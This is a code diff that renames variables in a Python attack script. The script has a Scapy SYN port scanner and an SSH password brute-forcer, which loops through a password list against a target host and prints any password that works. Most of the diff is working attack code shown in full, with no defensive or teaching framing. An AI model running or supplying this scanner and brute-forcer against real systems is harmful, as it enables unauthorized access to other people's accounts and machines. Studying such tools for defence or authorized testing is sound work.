@@ -8,12 +8,12 @@ def scanport(target, port):
     sport = RandShort()
     conf.verb = 0
     print("Trying port", port)   
-    synPkt = sr1(
+    synpkt = sr1(
         IP(dst=target)/TCP(sport=sport, dport=port, flags="S", options=[('Timestamp', (0, 0))]), timeout=0.5, verbose=0
                  )
-    if synPkt != None:
-        if synPkt.haslayer(TCP):
-            if synPkt[TCP].flags == 0x12:   #use hex
+    if synpkt != None:
+        if synpkt.haslayer(TCP):
+            if synpkt[TCP].flags == 0x12:
                 sr(IP(dst=target)/TCP(sport=sport, dport=port, flags="R"), timeout=2)
                 return True
     return False
@@ -34,16 +34,16 @@ def ssh_bruteforce(target, target_port):
     with open("PasswordList.txt") as fp:
         passwords = [line.strip() for line in fp]
         user = input("Enter SSH login to use: ")
-        SSHclient = paramiko.SSHClient()
-        SSHclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        SSHclient.load_system_host_keys()
+        ssh_client = paramiko.SSHClient()
+        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh_client.load_system_host_keys()
 
         for pwd in passwords:
             print("Trying authentication with : ", user, "  ", pwd)
             try:
-                SSHclient.connect(target, port=int(target_port), username=user, password=pwd, timeout=5)
+                ssh_client.connect(target, port=int(target_port), username=user, password=pwd, timeout=5)
                 print("Password FOUND: ", pwd)
-                SSHclient.close()
+                ssh_client.close()
                 break
             except socket.timeout:
                 print("SSH connection timed out")
